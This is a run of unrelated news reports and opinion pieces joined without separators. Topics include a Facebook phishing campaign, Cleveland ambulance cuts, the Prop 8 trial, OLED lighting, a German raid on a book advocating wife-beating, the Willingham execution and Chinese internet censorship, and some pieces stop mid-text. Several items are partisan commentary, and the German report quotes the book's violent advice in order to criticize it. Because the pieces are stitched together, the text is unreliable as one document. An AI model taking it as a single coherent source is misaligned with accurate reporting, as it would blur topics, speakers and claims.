Separately , Facebook has again fallen victim to internet crime .
The internet security firm Websense said thousands of malicious fake messages had been sent out , purporting to come from Facebook Support .
The message invites users to download a new password , but carries a piece of software that could allow their machine to be invaded by hackers .
CLEVELAND , Ohio --
The days of Cleveland paramedics hauling people to the hospital for minor ailments such as hemorrhoids and headaches are over .
At 7 a.m. today , Cleveland Emergency Medical Services will no longer serve as a hospital taxi for problems such as toothaches , boils and similar illnesses .
Callers with the most serious ailments , such as chest pains and trouble breathing , will still be treated before paramedics are dispatched on low - priority runs .
Those lesser calls will not be dispatched until 10 ambulances become available and all life - threatening calls are finished .
Cleveland residents have been accustomed to paramedics coming whenever called .
Paramedics and firefighters have dubbed the service " You call , we 'll haul " because very few calls have been refused since EMS formed in 1975 .
" This is a huge step for Cleveland , " EMS Commissioner Ed Eckart said .
" This is a step back from a long - standing culture in this city . "
The change is prompted , at least in part , by budget cuts .
Cleveland is trying to close a projected $ 23 million budget gap in 2010 .
The policy should not discourage residents , especially the elderly , from seeking medical help , Eckart said .
" If they need it , they should call , " Eckart said .
" We do n't want to scare anyone away . "
The city will operate a minimum of 15 ambulances a day starting today , down from 18 last year .
EMS received 80,000 calls last year and transported 66,000 patients to hospitals .
The city expects the policy to halt about 2,500 calls this year .
On a daily basis , EMS will analyze every held call and those where ambulances are not sent to ensure ambulances are being properly dispatched .
Eckart expects some people will exaggerate their medical problems to get an ambulances .
For example , EMS will look for calls where patients complain of breathing problems but paramedics only find hemorrhoids or minor ailments .
Another 25,000 callers could be turned away once EMS determines who abuses the system .
But that will take time to figure out , Eckart said .
" I do n't feel we have the oversight in place yet , " Eckart said .
" This is a huge change . "
Until October , the city classified medical calls into four categories -- Delta , Charlie , Bravo and Alpha -- based on the severity of the emergency .
A call about a heart attack would be classified as a Delta , for example , and a sprained ankle would be an Alpha .
It added a fifth category , Omega , in October .
That classification is for nonlife - threatening flu calls .
The city feared flu calls could increase response times , limiting the ability to handle other medical emergencies .
Callers in serious distress are handled as a typical call regardless of whether it is flu -related .
Highlights of the new policy include :
All Bravo , Alpha and Omega calls will be held until 10 ambulances are available and all life - threatening calls all cleared .
EMS dispatchers will call those people every 10 minutes to determine if the call status should be elevated or if they found another route to the hospital .
Callers with minor ailments will be directed to neighborhood clinics , social - service agencies and the United Way 's " 2 - 1 - 1 First Call For Help . "
The service is a partnership among the agency , the city and county .
The city is working with MetroHealth Medical System , Cleveland Clinic and University Hospitals to establish call lines in order to direct people to neighborhood clinics operated by the hospitals .
Patients with minor ailments will no longer be allowed to pick what hospital they receive treatment .
Paramedics will keep people close to their home and in their provider networks .
The most severe will still be taken to the hospital that best serves the illnesses or injuries .
Before today , the city sent ambulances for any calls involving people 17 or younger and older than 60 .
The ages have been expanded to people 70 or older and those 5 years or younger .
EMS union chief Stephen Palek expected some sort of policy change because of the city 's looming deficit .
The change , he said , is a big departure from the way paramedics have worked for three decades .
Paramedics are ready for the challenge , he added .
" We 're going to evaluate it and proceed cautiously , " Palek said .
" We 're going to make sure the patients are cared for properly . "
The national average for high - priority responses is about nine minutes , Eckart said .
He stressed that the time in Cleveland is consistently between six and seven minutes and should improve more with this policy .
For years , paramedics were sent for sprained ankles and slight fevers .
City officials acknowledged that other big cites began scaling back their EMS services in the last several years because of rising health care costs and more people lack medical coverage .
Mayor Frank Jackson has ordered pay cuts for non-union employees in an effort to offset a projected deficit this year .
Many unions have accepted concessions , while others refused .
The city plans to lay off four emergency medical technicians , one EMT trainee and one dispatcher .
Seven vacant EMT positions will go unfilled .
Jackson hired a private consultant last year to examine how the city can slash expenses .
The 344 - page report released in November made more than 175 recommendations for future budget cuts -- some of them promised to be painful .
This policy change came from that report , said Maureen Harper , a spokeswoman for Jackson .
She added : " This is a good way to help us provide services . "
Ever wonder why the guy who brings in Starbucks each morning seems to be about twice as perky as those schmucks toting plastic tumblers from Dunkin ’ Donuts or McDonald’s ?
The answer : not all java is brewed equal .
According to the chart above , one 16 - ounce cup of Starbucks has more than 250 milligrams of caffeine–almost double the amount of its contemporaries .
Though the chart itself has some flaws –the numbers are n’t adjusted to account for equal serving sizes , for instance–it allows you to make some simple guestimates about the effectiveness of your brand of go - juice .
Most importantly , it tells you how many espressos ( or Jolts or NOS ’s if want to be laughed out of the boardroom ) it takes to turn counter productive ; Jitters occur around 300 mgs .
[ Those interested in how tea stacks up , click here . ]
Just remember that caffeine has about a five - hour half life , so sneaking out for that second coffee break the next time you have a case of the Mondays might actually make you feel more on edge .

Bill O'Reilly devoted his leadoff Talking Points Memo segment and the following conversation with Dick " The Troll Who Lives Under the Bridge " Morris to the notion that , if another terrorist attack occurs on President Obama 's watch , he 's gonna be all washed up .
Nevermind that , of course , no one has yet died from a terrorist attack on Obama 's watch .
( O' Reilly 's counting the Fort Hood shootings as a " terrorist attack , " though of course there is n't much evidence that it actually was . )
Still , you have to wonder where O'Reilly and Morris and all these other right - wing blame - meisters were back in 2001 and 2002 , in the wake of an actual terrorist event that actually killed 3,000 people .
Oh , that 's right -- they were busy proclaiming that any blame - laying against Bush was beyond the realm of acceptable discourse .
If you suggested back then that Bush had been asleep at the wheel on terrorism on 9/11 , you were accused of being a traitor who hated America .
Oh , and let 's just remember exactly what George W. Bush 's record on terrorism was :
Afterward , of course , then - National Security Adviser Condoleezza Rice told the press : " I do n't think anybody could have predicted that these people would take an airplane and slam it into the World Trade Center , take another one and slam it into the Pentagon ; that they would try to use an airplane as a missile , a hijacked airplane as a missile . "
( As a matter of fact , just such a scenario had been foreseen by intelligence officials in 1998 , as Rice later admitted . )
Then there was the Aug. 6 , 2001 , presidential daily briefing titled " Bin Laden determined to strike in US , " which concluded :
We have not been able to corroborate some of the more sensational threat reporting , such as that from a ---- service in 1998 saying that Bin Laden wanted to hijack a U.S. aircraft to gain the release of " Blind Sheikh " Omar Abdel Rahman and other U.S. - held extremists .
Nevertheless , FBI information since that time indicates patterns of suspicious activity in this country consistent with preparations for hijackings or other types of attacks , including recent surveillance of federal buildings in New York .
The FBI is conducting approximately 70 full - field investigations throughout the U.S. that it considers bin Laden - related .
CIA and the FBI are investigating a call to our embassy in the UAE in May saying that a group or bin Laden supporters was in the U.S. planning attacks with explosives .
We also remember that New York Times report , summed up by Eric Alterman :
Tenet briefed Condi Rice about a potentially catastrophic terrorist attack on the United States on July 10 , 2001 .
Rice ignored the briefing , just as she and Bush both ignored the August 6 " Bin Laden Determined to Strike in US " memo , when Bush told the CIA briefer who delivered the memo to him that he had " covered his ass " and then went fishing for the rest of the day .
Rice not only ignored the briefing , but also misled the 9 - 11 Commission and then lied when confronted with the evidence by Bob Woodward .
Rice and the Bush administration also went to great measures to cover up their own incompetence , too .
Then there was the Hart - Rudman Commission report , which warned the White House in May 2001 that it needed to take serious steps to prevent a terrorist attack .
The report was ignored .
So was Richard Clarke 's memo of January 2001 warning of the terrorist threat .
All this is consistent with what Clarke and other insiders reported about the Bush White House 's pre-9/11 approach to terrorism :
They viewed it as a " Clinton thing , " and thus dismissed it as a minor concern for largely ideological reasons .
That 's borne out by the Bush White House 's pre-9/11 actions on a pure policy level :
The Bush Administration actually reversed the Clinton Administration 's strong emphasis on counterterrorism and counterintelligence .
Attorney General John Ashcroft not only moved aggressively to reduce DoJ 's anti-terrorist budget but also shift DoJ 's mission in spirit to emphasize its role as a domestic police force and anti-drug force .
These changes in mission were just as critical as the budget changes , with Ashcroft , in effect , guiding the day to day decisions made by field officers and agents .
And all of this while the Administration was receiving repeated warnings about potential terrorist attacks .
Bush may have done everything right and the 9/11 terrorists might still have succeeded -- though taking some concrete steps ( particularly heightening awareness and security at airports , given the specific nature of the warnings ) would have increased our chances of catching them .
What was never excusable was that Bush and Co. were asleep at the wheel on 9/11 regarding their duty to " keep us safe " -- and no amount of historical revisionism by wistful dolphin ladies will erase that fact .
Nor is the fact that Bush 's " war on terror " has certifiably made us less safe , and more likely to suffer future terrorist attacks , as that 2006 National Intelligence Estimate made clear :
A stark assessment of terrorism trends by American intelligence agencies has found that the American invasion and occupation of Iraq has helped spawn a new generation of Islamic radicalism and that the overall terrorist threat has grown since the Sept. 11 attacks .
The classified National Intelligence Estimate attributes a more direct role to the Iraq war in fueling radicalism than that presented either in recent White House documents or in a report released Wednesday by the House Intelligence Committee , according to several officials in Washington involved in preparing the assessment or who have read the final document .
The intelligence estimate , completed in April , is the first formal appraisal of global terrorism by United States intelligence agencies since the Iraq war began , and represents a consensus view of the 16 disparate spy services inside government .
Titled “ Trends in Global Terrorism : Implications for the United States , ’’ it asserts that Islamic radicalism , rather than being in retreat , has metastasized and spread across the globe .
In other words , Bush botched the job of keeping us safe , both during his tenure and for the foreseeable future .
But if we suffer another terrorist attack as a result of that botch , well , it 'll be Obama 's fault .
Neat trick .

SAN FRANCISCO —
A leading proponent of Proposition 8 found himself on trial Thursday inside the boundaries of the historic federal court trial here to decide the legality of California ’s ban on same - sex marriage .
During an afternoon of scathing inquiry from prominent plaintiffs ’ attorney David Boies , William Tam , a controversial figure in the Proposition 8 movement , was confronted repeatedly on views depicted as hostile to the rights of gays and lesbians .
Tam testified he likened same - sex marriage to pedophilia , polygamy and legalizing sex with children , and that California would fall into the “ hands of Satan ” if same - sex couples could wed .
The San Francisco - based Proposition 8 proponent , called as part of the case to overturn the state ’s same - sex marriage ban , said that he primarily opposed same - sex marriage because it would encourage children to “ marry John or Jane ” of the same - sex when they “ grow up . ”
“ I believe if the term marriage can be used beyond one man , one woman , then any two persons of any age , of any relationship , can use that same argument to ask for the term marriage , ” Tam testified .
“ That would lead to incest .
That would lead to polygamy .
If this is a civil right , what would prevent other groups from asking for the same right ? ”
With the plaintiffs nearing the end of their witnesses , Tam was called to the witness stand as part of the legal challenge to California ’s voter - approved 2008 ban on same - sex marriage unfolding before Chief U.S. District Judge Vaughn Walker .
Plaintiffs ’ lawyers consider
Tam ’s harsh outlook toward same - sex marriage important to proving that Proposition 8 was fueled by hostility and animus toward gays and lesbians , providing reason to give them greater protection under the U.S. Constitution .
Proposition 8 supporters insist they oppose same - sex marriage to preserve the traditional definition of heterosexual marriage , not to discriminate against the rights of gays and lesbians .
Proposition 8 lawyer Nicole Moss , through her questions , tried to distance the campaign from Tam ’s statements , depicting him as going rogue with his statements about gays and lesbians without the consent of Proposition 8 campaign officials .
“ I was acting independently , ” Tam said of statements he made that were not approved by ProtectMarriage.com and Proposition 8 ’s leadership .
Boies , however , portrayed Tam as inextricably linked to the campaign , showing e-mails in which he regularly communicated with ProtectMarriage.com officials and evidence Tam mobilized the Asian community and organized rallies against same - sex marriage .
The plaintiffs are expected to finish their case today with the testimony of another expert , University of California - Davis psychology professor Greg Herek , who will discuss the nature of homosexuality and its characteristics .
Earlier Thursday , Stanford University political - science professor Gary Segura finished his testimony , which amounted to the equivalent of a full day on the stand .
He was grilled by Proposition 8 lawyers on his position that gays and lesbians are “ powerless ” in the political arena .

Wallpaper that can glow with light and bendable flat - panel screens are a step closer thanks to research into organic LEDs ( OLEDs ) , which are widely hailed as the next generation of environmentally friendly lighting technology .
OLEDs use very little power to produce light , even compared with modern energy - saving bulbs .
The chemicals they are made from can be painted on to thin , flexible surfaces , allowing them potentially to be used to replace traditional lightbulbs in homes and offices with panels of energy - efficient light built into walls , windows or even furniture .
Other uses include flexible display screens , whose very low power consumption would mean they could operate without mains power , for example as roadside traffic warning signs powered by small solar panels .
Lomox Limited , a two - year - old company based in north Wales , awarded more than £ 450,000 today by the government - backed Carbon Trust to accelerate the development of its OLED technology .
Around a sixth of all the UK's electricity is used for lighting and Lomox claims its OLEDs are 2.5 times more efficient than standard energy - saving lightbulbs .
The Carbon Trust said that , if all modern lights were replaced by OLEDs , annual carbon emissions around the world could fall by 2.5 m tonnes by 2020 and almost 7.4 mT by 2050 .
Replacing old , incandescent bulbs with OLEDs would generate even greater CO2 savings .
OLEDs have shown much promise in laboratories but must get over two major hurdles to become widespread consumer items : they are expensive to make and they tend to have relatively short lifetimes .
" What our technology does , with the seven patents we have , is fix those problems , " said Ken Lacey , chief executive of Lomox .
He said his company 's OLEDs have the potential to last as long as modern fluorescent lights and , for the display sector , as long as LCD panels .
Lomox also claims its light matches natural light more closely than other energy - saving bulbs .
The company will focus its efforts on getting the first of its OLEDs to market by 2012 , mainly for outdoor lighting .
" The early part of the grant is to do the testing and take this out to that marketplace , " said Lacey .
Mark Williamson , director of innovations at the Carbon Trust , said : " Lighting is a major producer of carbon emissions .
This technology has the potential to produce ultra-efficient lighting for a wide range of applications , tapping into a huge global market .
We 're now on the look - out for other technologies that can save carbon and be a commercial success . "
The grant for Lomox is one of 164 projects supported by the Carbon Trust for small companies working on a range of renewable energy and energy efficiency technologies such as fuel cells , combined heat and power , bioenergy , solar power , low - carbon building technologies , marine energy devices and more efficient industrial processes .
Prügeltipps vom ehemaligen Profiboxer Peter Mühlbauer
Bei einer deutschlandweiten Razzia beschlagnahmt die Polizei islamistische Bücher mit Anleitungen , wie man Frauen schlagen soll
In der letzten Woche durchsuchten Polizeikräfte bundesweit 30 Einrichtungen nach der deutschen Übersetzung des in Saudi - Arabien erschienenen Buches Frauen im Schutz des Islam , das Ausführungen dazu enthält , wann und wie man Frauen schlagen soll .
Aufgefallen war das Werk den Behörden angeblich auf Veranstaltungen des islamistischen Wanderpredigers Pierre Vogel - einem Konvertiten , der vorher Profiboxer war .
Betroffen waren Moscheen , Gebets - und Verlagsräume sowie Privatwohnungen in mehreren Bundesländern .
Schwerpunkt der Aktion war Nordrhein - Westfalen mit 16 Objekten .
In Baden - Württemberg wurden sechs durchsucht , in Niedersachsen vier , in Bayern , Berlin , Rheinland - Pfalz und Sachsen jeweils eines .
Neben Vogel standen nach Auskunft der koordinierenden Staatsanwaltschaft Stuttgart auch der Konvertit Sven Lau und der türkischstämmige Muhammed Ciftci vom " Islamischen Bildungs - und Kulturzentrum Braunschweig e.V. " im Fadenkreuz der Ermittler .
Vogel , Lau und Ciftci betreiben angeblich gemeinsam das salafistische Portal " Einladung zum [ sic ] Paradies " .
Rechtsgrundlage für die Durchsuchungen war , dass die Bundesprüfstelle für jugendgefährdende Medien ( BPjM ) Passagen aus dem Buch als " Anreiz zur Gewalttätigkeit " und als Diskriminierung von Frauen einstufte und das Werk auf den Index setzte .
In den betroffenen Einrichtungen wurde es angeblich ausgelegt und an Jugendliche abgegeben .
Neben dem indizierten Buch nahm die Polizei bei den Durchsuchungen auch andere Schriften , Datenträger und Computer mit , zu denen die Behörden keine näheren Angaben machen wollen .
Das von der BPjM besonders beanstandete Kapitel 10 von Frauen im Schutz des Islam dreht sich um das " Schlagen der Frauen " .
Dort empfiehlt der Autor Abd ar - Rahman Asch - Schiha eine abgestufte Reaktion auf unbotmäßiges Verhalten von Eheweibern : Der bloßen Ermahnung folgt die " Meidung im Ehebett " und schließlich die körperliche Züchtigung .
Die ist dem Buch nach in einer
Weise durchzuführen , dass keine Knochenbrüche oder Blutergüsse zurückbleiben , vor allem nicht im Gesicht .
Die Schläge dienen dem Buch zufolge nicht der Demütigung , sondern als " Heilmittel " :
Die Medizin oder Behandlung einer jeden Unpässlichkeit kann manchmal sehr bitter sein .
Aber eine kranke Person wird das Medikament freudig einnehmen und die Bitterkeit der Medizin ertragen , um von seiner [ sic ]
Krankheit geheilt zu werden .
Solch eine Behandlung soll sich , wie angeblich " psychologisch festgestellt wurde " , sowohl bei Frauen " die überprüfen , führen und die Angelegenheiten ihrer Ehemänner leiten wollen , indem sie sie herumschicken , ihnen Befehle erteilen und sie kommandieren " als " wirkungsvoll " erwiesen haben , als auch bei unterwürfigen , die es " genießen [...] , geschlagen zu werden " .
" Dies " , so das Buch , sei " unter Frauen ein weit verbreiteter Instinkt , auch wenn sie sich darüber nicht im Klaren sind " :
Aus diesem besonderen Grund sind Frauen besser in der Lage , mehr Schmerzen zu ertragen als Männer .
Eine Ehefrau von diesem Frauentyp findet ihren Gatten immer anziehender und anbetungswürdiger , je mehr er sie schlägt .
Neben den Anleitungen zur angemessenen Gewaltausübung finden sich in dem Buch unter anderem mit Koranversen untermauerte Ausführungen dazu , warum eine Frau keinesfalls ohne die Begleitung eines männlichen Verwandten reisen darf , warum eine Gleichberechtigung der Geschlechter " unmöglich " ist und warum die " Kraft der Scheidung " beim Manne liegt .
Inwieweit eine Zensur solcher Schriften tatsächlich dazu beiträgt , Gewalt gegen und Diskriminierung von Frauen zu verringern , ist eher fraglich : Wahrscheinlich ist vielmehr , dass die hinter der Gewaltausübung stehende Ideologie ohne schriftliche Dokumente in deutscher Sprache von der Öffentlichkeit in geringerem Ausmaß als Problem wahrgenommen , aber trotzdem weiterhin mündlich oder in anderen Schriftsprachen tradiert und praktiziert wird .

I 'm not much of a basketball player .
Middle - age , with a shaky set shot and a bad knee , I can't hold my own in a YMCA pickup game , let alone against more organized competition .
But I could definitely beat LeBron James in a game of one - on - one .
The game just needs to feature two special rules :
It lasts until I score , and when I score , I win .
We might have to play for a few days , and Mr. James 's point total could well be creeping toward five figures before the contest ended , but eventually the gritty gutty competitor with a lunch - bucket work ethic ( me ) would subject the world 's greatest basketball player to a humiliating defeat .
The world 's greatest nation seems bent on subjecting itself to a similarly humiliating defeat , by playing a game that could be called Terrorball .
The first two rules of Terrorball are :
(1) The game lasts as long as there are terrorists who want to harm Americans ; and
(2) If terrorists should manage to kill or injure or seriously frighten any of us , they win .

How to Save Money On Your Groceries
Groceries are unavoidable because we all have to eat .
There are many ways to save money while shopping for groceries , but some are more consistent than others .
If you are feeding a large family , it is even more important to cut costs where you can , or this can easily become your largest monthly expense .
Coupons
Coupons are great , but only if they are for a product you already use .
Many websites will offer you large numbers of coupons for filling out their questionnaires and agreeing to try several offers , but that , in the end , rarely does much for you .
If you get a weekly newspaper , you should definitely take a look at the coupons , but only clip those for products that you use .
Purchasing something you wo n’t use because you have a coupon is n’t helpful .
The next trick with coupons is to try to match them up with sales at the supermarket .
If you purchase an item for $ 1.50 , originally selling for $ 2 and use a buy one , get one coupon , you drop the price to $ 0.75 a piece , which is considerable savings .
If you can do the same thing on double coupon days , the price drops is even more significant .
Stocking up and Planning
When foods you commonly use go on sale , purchase in bulk .
Recently , General Mills cereals were on sale at the local supermarket .
$ 1.50 a box is cheaper than generic brands , so I went and picked up 10 boxes of each cereal my kids liked .
Each 10 boxes qualified for an additional $ 5.00 off , so I ended up paying only a dollar a box for name brand cereals .
They do n’t spoil and we will eat them for a couple of months .
Once you have the weekly circulars , plan your menu for the next week .
Focus on the lower priced specials .
If ground beef is on sale , you might plan hamburgers one night , chili another and spaghetti with meat sauce a third .
You get three good meals for less .
If you set aside leftovers as part of the meal plan for the week , then let your kids know ; mine have a habit of eating anything they find in the fridge if not warned in advance .
Warehouse Stores
Check out the warehouse stores with an eye towards prices .
Take the flyers from the supermarket with you because some things are cheaper at the warehouse .
For example , tuna could be at $ 1 per can versus $ 1.69 at most markets , but others are more expensive .
Also , you will be tempted to purchase more than you need , and if you do n’t use it , the waste adds to the cost .
Warehouses are a great place to get discounts on prescriptions and meats .
You have to be willing to portion out the meats on you own since they come in large quantities and most people do n’t need six pounds of hamburger at one time .
Freeze things quickly to avoid spoilage .
Some cheeses and milk will freeze well , too .
Finally , when shopping for groceries , stick to seasonal produce .
Cantaloupe may be a $ 1 a piece in the summer , but $ 4 in the winter .
Local produce is also cheaper and if you eat a lot of it , you might want to look into a CSA farm where you can buy a share for the season .
Groceries are one of the best areas in which to cut back if your family budget needs a bit of updating , so get working !
In what is becoming a weekly Saturday event , I ’m going to share with you an article from the How to Save Money on Everything ebook .

Nearly 20 years ago Huntington Potter kicked up a storm of controversy with the idea that Down syndrome and Alzheimer 's were the same disease .
Now the evidence is in : He was right .
And that 's not all .
Down syndrome , artery - clogging cardiovascular disease , and possibly even diabetes , appear to share a common disease mechanism with Alzheimer 's disease ,
Dr. Potter and colleagues at the Florida Alzheimer 's Disease Research Center , USF Health Byrd Alzheimer 's Institute , recently reported .
The researchers ' two papers - one in Molecular Biology of the Cell and the other in PLoS ONE -- implicate the Alzheimer 's - associated protein beta amyloid ( amyloid protein ) , which damages the microtubule transport system responsible for moving chromosomes , proteins and other cargo around inside cells .
Both studies were done in mice and humans cell cultures modeling Alzheimer 's disease .
Together , the laboratory discoveries suggest that protecting the microtubule network from this amyloid damage might be an effective way to prevent or even reverse Alzheimer 's disease and associated disorders .
The first paper , by Antoneta Granic and colleagues published online Dec. 23 in Molecular Biology of the Cell , provides the mechanism behind previous work by Dr. Potter 's laboratory showing that all Alzheimer 's disease patients harbor some cells with three copies of chromosome 21 , known as trisomy 21 , instead of the usual two .
Trisomy 21 is a characteristic shared by all the cells in people with the birth defect Down syndrome as well .
This earlier work demonstrated that Alzheimer 's disease could be considered a late onset form of Down syndrome .
By age 30 to 40 , all people with Down syndrome develop the same brain pathology seen in Alzheimer 's disease , including a nerve - killing buildup of sticky amyloid protein clumps .
This contributes to accelerated nerve cell loss and dementia .
With the study reported in MBC , Dr. Potter and his colleagues now show that the Alzheimer 's - associated amyloid protein is the culprit that interferes with the microtubule transport system inside cells .
The microtubules are responsible for segregating newly duplicated chromosomes as cells divide .
" Beta amyloid basically creates potholes in the protein highways that move cargo , including chromosomes , around inside cells , " said Dr. Potter , who holds the Eric Pfeiffer Endowed Chair for Research on Alzheimer 's Disease .
When the microtubule network is disrupted , chromosomes can be incorrectly transported as cells divide and the result is new cells with the wrong number of chromosomes and an abnormal assortment of genes .
For example , Down syndrome cells contain three copies of the beta amyloid gene on chromosome 21 - leading to more accumulation of the " bad " amyloid protein over a lifetime , Dr. Potter says .
" Alzheimer 's disease probably is caused in part from the continuous development of new trisomy 21 nerve cells , which amplify the disease process by producing extra beta amyloid . "
The second paper by lead author Jose Abisambra and colleagues , published Dec. 31 in the online journal PLoS ONE , describes another consequence of the damaged microtubule network caused by the amyloid protein .
Many Alzheimer 's disease patients also commonly develop vascular diseases and diabetes .
Whether this coincidence is bad luck or due to shared disease processes is intensely debated .
Research teams have investigated the role that low - density lipoprotein ( LDL ) , the bad cholesterol that causes atherosclerosis , cardiovascular disease and stroke , may play in the development of Alzheimer 's with mixed results .
However , the USF group focused on the amyloid protein 's potential effects on LDL metabolism .
The receptor needed to detect and use LDL is among the proteins transported by the microtubules .
As previously reported by their colleagues in the MBC paper , the second USF team found that the amyloid protein inflicts damage to the microtubule network .
As a consequence , the receptor needed to pull LDL circulating throughout the bloodstream into the body 's cells has trouble getting to the cell surface to retrieve this bad cholesterol .
This interference with LDL metabolism may allow bad cholesterol to build up in into plaques that choke off blood supply to the brain and heart in people with Alzheimer 's , Dr. Potter said .
Similarly , other key proteins - including insulin receptors and receptors for brain signaling molecules -- are also likely locked inside cells when the transport system is damaged by amyloid or other factors .
" The insulin receptors are needed to get blood sugar inside the cell where it can be used for energy .
The nerve cell signaling receptors help promote memory and learning , " Dr. Potter said .
" So , if these receptors are unable to function properly , it may lead to diabetes and problems with learning and memory . "
" We 're beginning to understand how conditions like cardiovascular disease and diabetes may manifest some of the same underlying disease processes as Alzheimer 's disease , " he said , " rather than being independent diseases that just happen to develop in the same patient . "

Willingham was abandoned by his mother as a baby and raised by his father , a wrecker 's yard worker .
Soon after dropping out of high school he chalked up arrests for stealing a bike , driving drunk and shoplifting .
In his early 20s he married a girl called Stacy who , aged four , had seen her stepfather strangle her mother .
He drank too much and sometimes hit Stacy .
His life was unlike that of the square - jawed , ex-military pilot , wealthy rancher 's son and avowed Republican who replaced George Bush as Texas Governor .
It was this man , Ric Perry , who signed off on his execution .
Now it is Ric Perry who is the focus of much anger by the informed and articulate anti-death penalty movement in America who see within his bewildering actions and statements since the New Yorker piece appeared a fear of where Cameron Willingham 's ghost might lead .
Within three weeks of the publication of the New Yorker article , Perry suddenly , and totally unexpectedly , announced that he had fired members of the Texas Forensics Commission , whom he had appointed , just two days before the commission was to hear evidence from one of America 's mostly highly regarded arson experts on the Willingham case .
Dr Craig Beyler intended to say Willingham had been convicted on evidence of arson that was wrong .
Other leading experts have agreed that the original arson findings were made by ill - trained men who had little or no understanding of fire behaviour .
Investigators from Willingham 's home town 0f 20,000 , Corsicana , claimed at his trial that , judging by the fracture patterns on broken glass — known as crazed glass — left by the blaze , someone had trailed flammable liquid under the children 's beds , along the hallway and out the front door .
Scientists have since discovered that water sprayed by firemens ' hoses caused the fracture patterns when glass suddenly cools .
Among the other forensic evidence used against Willingham — mostly all of it now exposed as shoddy and wrong — was a key piece that helped the jury convict him within an hour .
The local investigators told the court they had found traces of flammable liquid on the front porch of Willingham 's house .
It was Dr Gerald Hurst , a fire expert , who discovered the truth .
The liquid came from the exploded canister of lighter fluid Willingham used to fuel his small barbecue – also on the front porch .
Hurst 's report said not a single piece of physical evidence supported a finding of arson .
Hurst , knowing early in 2004 that Willingham was on the verge of execution , wrote his report in such haste that he did n't fix the typos .
A man was about to executed on the basis of junk science , his report said .
Hurst rushed his report to the Governor 's office .
But one of the leading anti-death penalty lobby groups — the New York - based Innocence Project — has since discovered , using Freedom of Information Laws , that no one in Governor Perry 's office has any record of acknowledging it , taking note of its significance , or calling attention to it within the Government .
On February 17 , 2004 , just after he finished his last meal of barbecued pork ribs , Willingham was told Perry had refused to stay his execution .
Google Pegs Chicago's Top Searches of 2009
By Marcus Gilmer in Miscellaneous on Dec 1 , 2009 3:40 PM
With 2009 winding down , you 'll see a lot of lists over the next several weeks : best movies , best music , etc .
But what about what you searched for on the Internet ?
We 've already shown how much we like fooling around with Google and the folks at Google have boiled it down for us and can show us what the top searches in a number of cities are .
Now , before you look at the list and wonder about the absence of such popular searches as " Obama , " " Michael Jackson , " or " Chicagoist , " Google removed those large , nationally oriented searches .
According to Google :
" To compile these local lists , we found the most popular searches for each selected city and then ranked them based on how unique they were to that city .
A query is " unique " if it is disproportionately popular in a particular city compared to the rest of the country .
This method explains why popular local searches ( for example , for a specific movie theatre ) may appear higher than a term for which people across the country are searching ( for example , for a regional sports team ) . "
As for other searches we thought may wind up in the list , such as " Chicago Tribune , " or politicians such as Blago and Mayor Daley ?
Jake Parillo , who works for Google 's Chicago office , explained :
They were weighted too heavily outside of the city ( searchers for Blago are really from around the globe ) or in the Tribune 's case , most people do n't search for it .
They just type it in .
Same with Daley .
With the Olympics , he became a much bigger story .
You can consider these lists almost ' hyper local ' ( that is such a buzz word , is n't it ? ) .
We looked to rank terms that were ONLY searched for in Chicago and put those in order .
Also , these are ' fastest rising ' .
That 's a way of saying that these jumped out this year more than other terms .
So what , then , are the top 10 local Chicago Google search terms of 2009 ?
The Chinese government may have been caught flat - footed by the big Google anti-censorship announcement and the US speech on Internet freedom , but the country 's leaders are making up for lost time .
The US has had its chance to speak , and now it 's China 's turn to mount the moral high horse .
A basic message has crystallized over the last week as editors and reporters cover the basic talking points and conduct interviews with Chinese officials : there 's a double standard at work , all our censorship is legal , and China had nothing to do with Google hacking .
Here are the latest developments :
Let 's start teaching ' Net morality .
From Reuters : " China 's Education Ministry published a notice on Monday reminding schools they should be monitoring and filtering Web content , as well as teaching ' Internet morality . ' "
We had nothing to do with it .
China 's official news agency , Xinhua , conducted an interview on Sunday with a Ministry of Industry and Information Technology spokesperson , and the government is now willing to take a tougher line against the accusations that it was somehow behind the sophisticated cyber attacks on Google and 33 other companies .
" Accusation that the Chinese government participated in cyber attack , either in an explicit or inexplicit way , is groundless and aims to denigrate China , " said the spokesperson .
" We firmly opposed [ sic ] to that . "
It 's all legal .
In a separate interview from Sunday , Xinhua spoke with the State Council Information Office and received the now - common defense of China 's censorship : it 's all legal , and therefore not a problem .
" A spokesperson with China 's State Council Information Office told Xinhua in an exclusive interview , that China is regulating the Internet legally to build a more reliable , helpful information network that is beneficial to economic and social development , " said the news service .
That " more reliable , helpful information network " currently blocks access to Facebook , Twitter , and YouTube , despite the fact that censorship regulations allegedly cover only " online information which incites subversion of state power , violence and terrorism or includes pornographic contents . "
" China is willing to cooperate and exchange opinions on issues about Internet development and management with other countries , but opposes firmly to any defiance of Chinese laws , or intervening Chinese domestic affairs under the pretense of ' Internet management ' regardless of the truth , " the spokesperson said .
We do n't want any trouble .
If you 're curious why news outlets , a group that might seem highly interested in Internet and press freedom , make little noise on the subject , one editor 's perspective might help .
The Qingyuan Daily , a local paper from Guangdong Province , ran a January 1 editorial from editor - in - chief Pan Wei .
It concluded : " The editor - in - chief of this newspaper says : the best newspaper is one that does not cause trouble . "
No more dirty text messaging .
China now runs a new nationwide scanning system that attempts to crack down on dirty jokes and pornographic messages sent over SMS .
This has led to some dissatisfaction in China , with its huge mobile user base , especially because the keyword scanning system officially opens up every user 's text messages to government scrutiny .
One Chinese blogger notes , " Sending dirty jokes is a kind of etiquette for mobile socializing in China , and from my observations , if the person is the King of Jokes he will have a good base of friends , and a wide circle of contacts .
Even if you have n’t seen them for a long time , when you do meet up it ’s with a big smile , because as people get closer and closer there are numerous dirty jokes that will start to overflow in the heart and there is no way to suppress it . "
" Democracy " and " freedom " simply mean " self - interest . "
The People 's Daily newspaper is a major mouthpiece for the Chinese Communist Party .
In today 's edition , the paper blasted the US stance on Internet freedom as hypocritical .
The piece , authored by " ace PD reporter He Zhenhua , " points out the various legal and not - so - legal ways that the US keeps an eye on Internet activity .
" Let us look at ' network freedom ' in the US :
In order to resist Internet pornography , the U.S. ' Children 's Internet Protection Act ' [ note : this is the Child Online Protection Act , or COPA ]
American authorities have enacted requires all public network resources to curb Internet child porn , a serious crime in the country ; in order to respond to threats , Pentagon has developed a new type of troops — cyber troops , and also adopted several measures to beef up the military 's cyber warfare capacity ; shortly after the September 11 , 2001 terrorist attacks , the US Congress approved the Patriot Act to grant its security agencies the right to search telephone and e-mail communications in the name of anti-terrorism . "
The bottom line is that US talk of Internet freedom and democracy is about " double standards " and always has been .
" US self - interest [ is ] behind all these frequently changed or shifted means or tactics . "
It 's ... sort of true .
